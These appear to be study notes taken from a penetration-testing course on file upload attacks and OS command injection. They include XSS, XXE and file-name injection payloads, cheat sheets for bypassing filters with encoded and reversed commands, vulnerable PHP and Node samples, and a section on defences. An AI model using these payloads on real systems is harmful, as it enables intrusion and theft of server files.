	> This time we get File successfully uploaded, and our file is successfully uploaded to the server:
	> We can now visit our uploaded file, and we will see that we can successfully execute system commands:
	> Note: We see that the command output starts with GIF8 , as this was the first line in our PHP script to imitate the GIF magic bytes, and is now outputted as a plaintext before our PHP code is executed.
	> We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an Allowed MIME type with a disallowed Content-Type, an Allowed MIME/Content-Type with a disallowed extension, or a Disallowed MIME/Content-Type with an allowed extension, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.

-=-=-=
[+] Limite File Uploads
	> So far, we have been mainly dealing with filter bypasses to obtain arbitrary file uploads through a vulnerable web application, which is the main focus of this module at this level. While file upload forms with weak filters can be exploited to upload arbitrary files, some upload forms have secure filters that may not be exploitable with the techniques we discussed. However, even if we are dealing with a limited (i.e., non-arbitrary) file upload form, which only allows us to upload specific file types, we may still be able to perform some attacks on the web application.
	> Certain file types, like SVG, HTML, XML, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server. So, let's explore some of these attacks.

* XSS
	> Many file types may allow us to introduce a Stored XSS vulnerability to the web application by uploading maliciously crafted versions of them.
	> The most basic example is when a web application allows us to upload HTML files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.
	> Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the Comment or Artist parameters, as follows:
		m1l0js@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
		m1l0js@htb[/htb]$ exiftool HTB.jpg
		...SNIP...
		Comment                         :  "><img src=1 onerror=alert(window.origin)>

	> We can see that the Comment parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to text/html, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
	> Finally, XSS attacks can also be carried with SVG images, along with several other attacks. Scalable Vector Graphics (SVG) images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to HTB.svg:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
		<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
		    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
		    <script type="text/javascript">alert("window.origin");</script>
		</svg>

	> Once we upload the image to the web application, the XSS payload will be triggered whenever the image is displayed.
	> For more about XSS, you may refer to the Cross-Site Scripting (XSS) module.
	> Exercise: Try the above attacks with the exercise at the end of this section, and see whether the XSS payload gets triggered and displays the alert.

* XXE
	> Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (/etc/passwd):
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<svg>&xxe;</svg>

	> Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (/etc/passwd) printed on the page or shown in the page source. Similarly, if the web application allows the upload of XML documents, then the same payload can carry the same attack when the XML data is displayed on the web application.
	> While reading systems files like /etc/passwd can be very useful for server enumeration, it can have an even more significant benefit for web penetration testing, as it allows us to read the web application's source files. Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation.
	> To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
		<svg>&xxe;</svg>

	> Once the SVG image is displayed, we should get the base64 encoded content of index.php, which we can decode to read the source code. For more about XXE, you may refer to the Web Attacks module.
	> Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like PDF, Word Documents, PowerPoint Documents, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.
	> Another similar attack that is also achievable through these file types is an SSRF attack. We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions. For more about SSRF, you may refer to the Server-side Attacks module.

* DoS
	> Finally, many file upload vulnerabilities may lead to a Denial of Service (DOS) attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks, as discussed in the Web Attacks module.
	> Furthermore, we can utilize a Decompression Bomb with file types that use data compression, like ZIP archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.
	> Another possible DoS attack is a Pixel Flood attack with some image files that utilize image compression, like JPG or PNG. We can create any JPG image file with any image size (e.g. 500x500), and then manually modify its compression data to say it has a size of (0xffff x 0xffff), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.
	> In addition to these attacks, we may try a few other methods to cause a DoS on the back-end server. One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.
	> If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. ../../../etc/passwd), which may also cause the server to crash. Try to search for other examples of DOS attacks through a vulnerable file upload functionality.


[+] Other Upload Attacks
	> In addition to arbitrary file uploads and limited file upload attacks, there are a few other techniques and attacks worth mentioning, as they may become handy in some web penetration tests or bug bounty tests. Let's discuss some of these techniques and when we may use them.

* Injections in File Name
	> A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.
	> For example, if we name a file file$(whoami).jpg or file`whoami`.jpg or file.jpg||whoami, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution. You may refer to the Command Injections module for more information.
	> Similarly, we may use an XSS payload in the file name (e.g. <script>alert(window.origin);</script>), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. file';select+sleep(5);--.jpg), which may lead to an SQL injection if the file name is insecurely used in an SQL query.

* Upload Directory Disclosure
	> In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section. Furthermore, the Web Attacks/IDOR module discusses various methods of finding where files may be stored and identifying the file naming scheme.
	> Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.
	> Similarly, we may try various other techniques to cause the server to error out and disclose the uploads directory, along with additional helpful information.

* Windows-specific Attacks
	> We can also use a few Windows-Specific techniques in some of the attacks we discussed in the previous sections.
	> One such attack is using reserved characters, such as (|, <, >, *, or ?), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (CON, COM1, LPT1, or NUL), which may also cause an error as the web application will not be allowed to write a file with this name.
	> Finally, we may utilize the Windows 8.3 Filename Convention(https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (~) to complete the file name, which we can use to our advantage.
	> For example, to refer to a file called (hackthebox.txt) we can use (HAC~1.TXT) or (HAC~2.TXT), where the digit represents the order of the matching files that start with (HAC). As Windows still supports this convention, we can write a file called (e.g. WEB~.CONF) to overwrite the web.conf file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.

* Advanced File Upload Attacks
	> In addition to all of the attacks we have discussed in this module, there are more advanced attacks that can be used with file upload functionalities. Any automatic processing that occurs to an uploaded file, like encoding a video, compressing a file, or renaming a file, may be exploited if not securely coded.
	> Some commonly used libraries may have public exploits for such vulnerabilities, like the AVI upload vulnerability leading to XXE in ffmpeg. However, when dealing with custom code and custom libraries, detecting such vulnerabilities requires more advanced knowledge and techniques, which may lead to discovering an advanced file upload vulnerability in some web applications.
	> There are many other advanced file upload vulnerabilities that we did not discuss in this module. Try to read some bug bounty reports to explore more advanced file upload vulnerabilities.

-=-=-
[+] Preventing File Upload Vulnerabilities
	> Throughout this module, we have discussed various methods of exploiting different file upload vulnerabilities. In any penetration test or bug bounty exercise we take part in, we must be able to report action points to be taken to rectify the identified vulnerabilities.
	> This section will discuss what we can do to ensure that our file upload functions are securely coded and safe against exploitation and what action points we can recommend for each type of file upload vulnerability.

* Extension Validation
	> The first and most common type of upload vulnerabilities we discussed in this module was file extension validation. File extensions play an important role in how files and scripts are executed, as most web servers and web applications tend to use file extensions to set their execution properties. This is why we should make sure that our file upload functions can securely handle extension validation.
	> While whitelisting extensions is always more secure, as we have seen previously, it is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. shell.php.jpg). The following example shows how this can be done with a PHP web application, but the same concept can be applied to other frameworks:
		Code: php
		
		$fileName = basename($_FILES["uploadFile"]["name"]);
		
		// blacklist test
		if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
		    echo "Only images are allowed";
		    die();
		}
		
		// whitelist test
		if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
		    echo "Only images are allowed";
		    die();
		}

	< We see that with blacklisted extension, the web application checks if the extension exists anywhere within the file name, while with whitelists, the web application checks if the file name ends with the extension. Furthermore, we should also apply both back-end and front-end file validation. Even if front-end validation can be easily bypassed, it reduces the chances of users uploading unintended files, thus potentially triggering a defense mechanism and sending us a false alert.

* Content Validation
	> As we have also learned in this module, extension validation is not enough, as we should also validate the file content. We cannot validate one without the other and must always validate both the file extension and its content. Furthermore, we should always make sure that the file extension matches the file's content.
	> The following example shows us how we can validate the file extension through whitelisting, and validate both the File Signature and the HTTP Content-Type header, while ensuring both of them match our expected file type:
		Code: php
		
		$fileName = basename($_FILES["uploadFile"]["name"]);
		$contentType = $_FILES['uploadFile']['type'];
		$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
		
		// whitelist test
		if (!preg_match('/^.*\.png$/', $fileName)) {
		    echo "Only PNG images are allowed";
		    die();
		}
		
		// content test
		foreach (array($contentType, $MIMEtype) as $type) {
		    if (!in_array($type, array('image/png'))) {
		        echo "Only SVG images are allowed";
		        die();
		    }
		}

* Upload Disclosure
	> Another thing we should avoid doing is disclosing the uploads directory or providing direct access to the uploaded file. It is always recommended to hide the uploads directory from the end-users and only allow them to download the uploaded files through a download page.
	> We may write a download.php script to fetch the requested file from the uploads directory and then download the file for the end-user. This way, the web application hides the uploads directory and prevents the user from directly accessing the uploaded file. This can significantly reduce the chances of accessing a maliciously uploaded script to execute code.
	> If we utilize a download page, we should make sure that the download.php script only grants access to files owned by the users (i.e., avoid IDOR/LFI vulnerabilities) and that the users do not have direct access to the uploads directory (i.e., 403 error). This can be achieved by utilizing the Content-Disposition and nosniff headers and using an accurate Content-Type header.
	> In addition to restricting the uploads directory, we should also randomize the names of the uploaded files in storage and store their "sanitized" original names in a database. When the download.php script needs to download a file, it fetches its original name from the database and provides it at download time for the user. This way, users will neither know the uploads directory nor the uploaded file name. We can also avoid vulnerabilities caused by injections in the file names, as we saw in the previous section.
	> Another thing we can do is store the uploaded files in a separate server or container. If an attacker can gain remote code execution, they would only compromise the uploads server, not the entire back-end server. Furthermore, web servers can be configured to prevent web applications from accessing files outside their restricted directories by using configurations like (open_basedir) in PHP.

* Further Security
	> The above tips should significantly reduce the chances of uploading and accessing a malicious file. We can take a few other measures to ensure that the back-end server is not compromised if any of the above measures are bypassed.
	> A critical configuration we can add is disabling specific functions that may be used to execute system commands through the web application. For example, to do so in PHP, we can use the disable_functions configuration in php.ini and add such dangerous functions, like exec, shell_exec, system, passthru, and a few others.
	> Another thing we should do is to disable showing any system or server errors, to avoid sensitive information disclosure. We should always handle errors at the web application level and print out simple errors that explain the error without disclosing any sensitive or specific details, like the file name, uploads directory, or the raw errors.
	> Finally, the following are a few other tips we should consider for our web applications:
    		- Limit file size
    		- Update any used libraries
    		- Scan uploaded files for malware or malicious strings
    		- Utilize a Web Application Firewall (WAF) as a secondary layer of protection

	> Once we perform all of the security measures discussed in this section, the web application should be relatively secure and not vulnerable to common file upload threats. When performing a web penetration test, we can use these points as a checklist and provide any missing ones to the developers to fill any remaining gaps.


-=-=-=-=-=-=-===-
###Command injections

## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|-|-|-|-|
|Semicolon| `;`|`%3b`|Both|
|New Line| `\n`|`%0a`|Both|
|Background| `&`|`%26`|Both (second output generally shown first)|
|Pipe| `\|`|`%7c`|Both (only second output is shown)|
|AND| `&&`|`%26%26`|Both (only if first succeeds)|
|OR| `\|\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell| ` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell| `$()`|`%24%28%29`|Both (Linux-only)|

---
# Linux

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `printenv` | Can be used to view all environment variables |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `${IFS}` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}` | Commas will be replaced with spaces |
| **Other Characters** |
| `${PATH:0:1}` | Will be replaced with `/` |
| `${LS_COLORS:10:1}` | Will be replaced with `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`) |

---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `$@` or `\` | Linux only |
| **Case Manipulation** |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
| **Reversed Commands** |
| `echo 'whoami' \| rev` | Reverse a string |
| `$(rev<<<'imaohw')` | Execute reversed command |
| **Encoded Commands** |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |

---
# Windows

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD) |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell) |
| **Other Characters** |
| `%HOMEPATH:~0,-17%` | Will be replaced with `\` - (CMD) |
| `$env:HOMEPATH[0]` | Will be replaced with `\` - (PowerShell) |

---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `^` | Windows only (CMD) |
| **Case Manipulation** |
| `WhoAmi` | Simply send the character with odd cases |
| **Reversed Commands** |
| `"whoami"[-1..-20] -join ''` | Reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
| **Encoded Commands** |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |



[+] Intro to command injections

* A Command Injection vulnerability is among the most critical types of vulnerabilities. It allows us to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network. If a web application uses user-controlled input to execute a system command on the back-end server to retrieve and return specific output, we may be able to inject a malicious payload to subvert the intended command and execute our commands.

* What are Injections
	> Injection vulnerabilities are considered the number 3 risk in OWASP's Top 10 Web App Risks, given their high impact and how common they are. Injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed, which may lead to subverting the intended outcome of the query to a different outcome that is useful to the attacker.
	> There are many types of injections found in web applications, depending on the type of web query being executed. The following are some of the most common types of injections:
	> Injection 					Description
		OS Command Injection 			Occurs when user input is directly used as part of an OS command.
		Code Injection 				Occurs when user input is directly within a function that evaluates code.
		SQL Injections 				Occurs when user input is directly used as part of an SQL query.
		Cross-Site Scripting/HTML Injection 	Occurs when exact user input is displayed on a web page.

	> There are many other types of injections other than the above, like LDAP injection, NoSQL Injection, HTTP Header Injection, XPath Injection, IMAP Injection, ORM Injection, and others. Whenever user input is used within a query without being properly sanitized, it may be possible to escape the boundaries of the user input string to the parent query and manipulate it to change its intended purpose. This is why as more web technologies are introduced to web applications, we will see new types of injections introduced to web applications.

* OS Command Injections
	> When it comes to OS Command Injections, the user input we control must directly or indirectly go into (or somehow affect) a web query that executes system commands. All web programming languages have different functions that enable the developer to execute operating system commands directly on the back-end server whenever they need to. This may be used for various purposes, like installing plugins or executing certain applications.
	> PHP Example
		- For example, a web application written in PHP may use the exec, system, shell_exec, passthru, or popen functions to execute commands directly on the back-end server, each having a slightly different use case. The following code is an example of PHP code that is vulnerable to command injections:
			Code: php
			
			<?php
			if (isset($_GET['filename'])) {
			    system("touch /tmp/" . $_GET['filename'] . ".pdf");
			}
			?>

		- Perhaps a particular web application has a functionality that allows users to create a new .pdf document that gets created in the /tmp directory with a file name supplied by the user and may then be used by the web application for document processing purposes. However, as the user input from the filename parameter in the GET request is used directly with the touch command (without being sanitized or escaped first), the web application becomes vulnerable to OS command injection. This flaw can be exploited to execute arbitrary system commands on the back-end server.

* NodeJS Example
	> This is not unique to PHP only, but can occur in any web development framework or language. For example, if a web application is developed in NodeJS, a developer may use child_process.exec or child_process.spawn for the same purpose. The following example performs a similar functionality to what we discussed above:
		Code: javascript
		
		app.get("/createfile", function(req, res){
		    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
		})

	> The above code is also vulnerable to a command injection vulnerability, as it uses the filename parameter from the GET request as part of the command without sanitizing it first. Both PHP and NodeJS web applications can be exploited using the same command injection methods.

* Likewise, other web development programming languages have similar functions used for the same purposes and, if vulnerable, can be exploited using the same command injection methods. Furthermore, Command Injection vulnerabilities are not unique to web applications but can also affect other binaries and thick clients if they pass unsanitized user input to a function that executes system commands, which can also be exploited with the same command injection methods.
* The following section will discuss different methods of detecting and exploiting command injection vulnerabilities in web applications.

-=-=
[+] Detection

	> The process of detecting basic OS Command Injection vulnerabilities is the same process for exploiting such vulnerabilities. We attempt to append our command through various injection methods. If the command output changes from the intended usual result, we have successfully exploited the vulnerability. This may not be true for more advanced command injection vulnerabilities because we may utilize various fuzzing methods or code reviews to identify potential command injection vulnerabilities. We may then gradually build our payload until we achieve command injection. This module will focus on basic command injections, where we control user input that is being directly used in a system command execution a function without any sanitization.
	> To demonstrate this, we will use the exercise found at the end of this section.

* Command Injection Detection
	> When we visit the web application in the below exercise, we see a Host Checker utility that appears to ask us for an IP to check whether it is alive or not: Basic Exercise
	> We can try entering the localhost IP 127.0.0.1 to check the functionality, and as expected, it returns the output of the ping command telling us that the localhost is indeed alive: Basic Exercise
	> Although we do not have access to the source code of the web application, we can confidently guess that the IP we entered is going into a ping command since the output we receive suggests that. As the result shows a single packet transmitted in the ping command, the command used may be as follows:
		Code: bash
		ping -c 1 OUR_INPUT

	> If our input is not sanitized and escaped before it is used with the ping command, we may be able to inject another arbitrary command. So, let us try to see if the web application is vulnerable to OS command injection.

* Command Injection Methods
	> To inject an additional command to the intended one, we may use any of the following operators:
	> Injection Operator 	Injection Character 	URL-Encoded Character 	Executed Command
	Semicolon 		; 			%3b 			Both
	New Line 		\n 			%0a 			Both
	Background 		& 			%26 			Both (second output generally shown first)
	Pipe 			| 			%7c 			Both (only second output is shown)
	AND 			&& 			%26%26 			Both (only if first succeeds)
	OR 			|| 			%7c%7c 			Second (only if first fails)
	Sub-Shell 		`` 			%60%60 			Both (Linux-only)
	Sub-Shell 		$() 			%24%28%29 		Both (Linux-only)

	> We can use any of these operators to inject another command so both or either of the commands get executed. We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.
	> Tip: In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (``) or with a sub-shell operator ($()).
	> In general, for basic command injection, all of these operators can be used for command injections regardless of the web application language, framework, or back-end server. So, if we are injecting in a PHP web application running on a Linux server, or a .Net web application running on a Windows back-end server, or a NodeJS web application running on a macOS back-end server, our injections should work regardless.
	> Note: The only exception may be the semi-colon ;, which will not work if the command was being executed with Windows Command Line (CMD), but would still work if it was being executed with Windows PowerShell.
	> In the next section, we will attempt to use one of the above injection operators to exploit the Host Checker exercise.

-=-=
[+] Injecting Commands
	> So far, we have found the Host Checker web application to be potentially vulnerable to command injections and discussed various injection methods we may utilize to exploit the web application. So, let's start our command injection attempts with the semi-colon operator (;).

* Injecting Our Command
	> We can add a semi-colon after our input IP 127.0.0.1, and then append our command (e.g. whoami), such that the final payload we will use is (127.0.0.1; whoami), and the final command to be executed would be:
		Code: bash
		ping -c 1 127.0.0.1; whoami

	> As we can see, the final command successfully runs, and we get the output of both commands (as mentioned in the previous table for ;). Now, we can try using our previous payload in the Host Checker web application: Basic Injection
	> As we can see, the web application refused our input, as it seems only to accept input in an IP format. However, from the look of the error message, it appears to be originating from the front-end rather than the back-end. We can double-check this with the Firefox Developer Tools by clicking [CTRL + SHIFT + E] to show the Network tab and then clicking on the Check button again:

* Basic Injection
	> As we can see, no new network requests were made when we clicked on the Check button, yet we got an error message. This indicates that the user input validation is happening on the front-end.
	> This appears to be an attempt at preventing us from sending malicious payloads by only allowing user input in an IP format. However, it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end. This occurs for various reasons, like having two different teams working on the front-end/back-end or trusting front-end validation to prevent malicious payloads.
	> However, as we will see, front-end validations are usually not enough to prevent injections, as they can be very easily bypassed by sending custom HTTP requests directly to the back-end.

* Bypassing Front-End Validation
	> The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application. To do so, we can start Burp Suite or ZAP and configure Firefox to proxy the traffic through them. Then, we can enable the proxy intercept feature, send a standard request from the web application with any IP (e.g. 127.0.0.1), and send the intercepted HTTP request to repeater by clicking [CTRL + R], and we should have the HTTP request for customization:
	> We can now customize our HTTP request and send it to see how the web application handles it. We will start by using the same previous payload (127.0.0.1; whoami). We should also URL-encode our payload to ensure it gets sent as we intend. We can do so by selecting the payload and then clicking [CTRL + U]. Finally, we can click Send to send our HTTP request:
	> As we can see, the response we got this time contains the output of the ping command and the result of the whoami command, meaning that we successfully injected our new command.

-=-=-=
[+] Other Injection Operators
	> Before we move on, let us try a few other injection operators and see how differently the web application would handle them.
* AND Operator
	> We can start with the AND (&&) operator, such that our final payload would be (127.0.0.1 && whoami), and the final executed command would be the following:
		Code: bash
		ping -c 1 127.0.0.1 && whoami

	> As we can see, the command does run, and we get the same output we got previously. Try to refer to the injection operators table from the previous section and see how the && operator is different (if we do not write an IP and start directly with &&, would the command still work?).
	> Now, we can do the same thing we did before by copying our payload, pasting it in our HTTP request in Burp Suite, URL-encoding it, and then finally sending it: Basic Attack
	> As we can see, we successfully injected our command and received the expected output of both commands.
	
* OR Operator
	> Finally, let us try the OR (||) injection operator. The OR operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the OR operator would make our new command execute if the first one fails.
	> If we try to use our usual payload with the || operator (127.0.0.1 || whoami), we will see that only the first command would execute:
		21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami
		PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
		64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms
		
		--- 127.0.0.1 ping statistics ---
		1 packets transmitted, 1 received, 0% packet loss, time 0ms
		rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms

	> This is because of how bash commands work. As the first command returns exit code 0 indicating successful execution, the bash command stops and does not try the other command. It would only attempt to execute the other command if the first command failed and returned an exit code 1.
	> Try using the above payload in the HTTP request, and see how the web application handles it.
	> Let us try to intentionally break the first command by not supplying an IP and directly using the || operator (|| whoami), such that the ping command would fail and our injected command gets executed:
		21y4d@htb[/htb]$ ping -c 1 || whoami
		ping: usage error: Destination address required
		21y4d

	> As we can see, this time, the whoami command did execute after the ping command failed and gave us an error message. So, let us now try the (|| whoami) payload in our HTTP request:
	> We see that this time we only got the output of the second command as expected. With this, we are using a much simpler payload and getting a much cleaner result.

	> Such operators can be used for various injection types, like SQL injections, LDAP injections, XSS, SSRF, XML, etc. We have created a list of the most common operators that can be used for injections:
		- Injection Type 				Operators
		SQL Injection 					' , ; -- /* */
		Command Injection 				; &&
		LDAP Injection 					* ( ) & |
		XPath Injection 				' or and not substring concat count
		OS Command Injection 				; & |
		Code Injection 					' ; -- /* */ $() ${} #{} %{} ^
		Directory Traversal/File Path Traversal 	../ ..\\ %00
		Object Injection 				; & |
		XQuery Injection 				' ; -- /* */
		Shellcode Injection 				\x \u %u %n
		Header Injection 				\n \r\n \t %0d %0a %09

	> Keep in mind that this table is incomplete, and many other options and operators are possible. It also highly depends on the environment we are working with and testing.
	> In this module, we are mainly dealing with direct command injections, in which our input goes directly into the system command, and we are receiving the output of the command. For more on advanced command injections, like indirect injections or blind injection, you may refer to the Whitebox Pentesting 101: Command Injection module, which covers advanced injections methods and many other topics.

-=-=-
[+] Identifying Filters
	> As we have seen in the previous section, even if developers attempt to secure the web application against injections, it may still be exploitable if it was not securely coded. Another type of injection mitigation is utilizing blacklisted characters and words on the back-end to detect injection attempts and deny the request if any request contained them. Yet another layer on top of this is utilizing Web Application Firewalls (WAFs), which may have a broader scope and various methods of injection detection and prevent various other attacks like SQL injections or XSS attacks.
	> This section will look at a few examples of how command injections may be detected and blocked and how we can identify what is being blocked.

* Filter/WAF Detection
	> Let us start by visiting the web application in the exercise at the end of this section. We see the same Host Checker web application we have been exploiting, but now it has a few mitigations up its sleeve. We can see that if we try the previous operators we tested, like (;, &&, ||), we get the error message invalid input: Filter
	> This indicates that something we sent triggered a security mechanism in place that denied our request. This error message can be displayed in various ways. In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the PHP web application itself. If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.
	> Let us check the payload we sent:
		Code: bash
		127.0.0.1; whoami
	> Other than the IP (which we know is not blacklisted), we sent:
    		- A semi-colon character ;
    		- A space character
    		- A whoami command

	> So, the web application either detected a blacklisted character or detected a blacklisted command, or both. So, let us see how to bypass each.

* Blacklisted Characters
	> A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The PHP code may look something like the following:
		Code: php
		
		$blacklist = ['&', '|', ';', ...SNIP...];
		foreach ($blacklist as $character) {
		    if (strpos($_POST['ip'], $character) !== false) {
		        echo "Invalid input";
		    }
		}

	> If any character in the string we sent matches a character in the blacklist, our request is denied. Before we start our attempts at bypassing the filter, we should try to identify which character caused the denied request.

* Identifying Blacklisted Character
	> Let us reduce our request to one character at a time and see when it gets blocked. We know that the (127.0.0.1) payload does work, so let us start by adding the semi-colon (127.0.0.1;): Filter Character
	> We still get an invalid input, error meaning that a semi-colon is blacklisted. So, let's see if all of the injection operators we discussed previously are blacklisted.

-=-=-==
[+] Bypassing Space Filters
	> There are numerous ways to detect injection attempts, and there are multiple methods to bypass these detections. We will be demonstrating the concept of detection and how bypassing works using Linux as an example. We will learn how to utilize these bypasses and eventually be able to prevent them. Once we have a good grasp on how they work, we can go through various sources on the internet to discover other types of bypasses and learn how to mitigate them.

* Bypass Blacklisted Operators
	> We will see that most of the injection operators are indeed blacklisted. However, the new-line character is usually not blacklisted, as it may be needed in the payload itself. We know that the new-line character works in appending our commands both in Linux and on Windows, so let's try using it as our injection operator.
		(https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_operator.jpg)
	> As we can see, even though our payload did include a new-line character, our request was not denied, and we did get the output of the ping command, which means that this character is not blacklisted, and we can use it as our injection operator. Let us start by discussing how to bypass a commonly blacklisted character - a space character.

* Bypass Blacklisted Spaces
	> Now that we have a working injection operator, let us modify our original payload and send it again as (127.0.0.1%0a whoami): Filter Space
	> As we can see, we still get an invalid input error message, meaning that we still have other filters to bypass. So, as we did before, let us only add the next character (which is a space) and see if it caused the denied request: Filter Space
	> As we can see, the space character is indeed blacklisted as well. A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character!

* Using Tabs
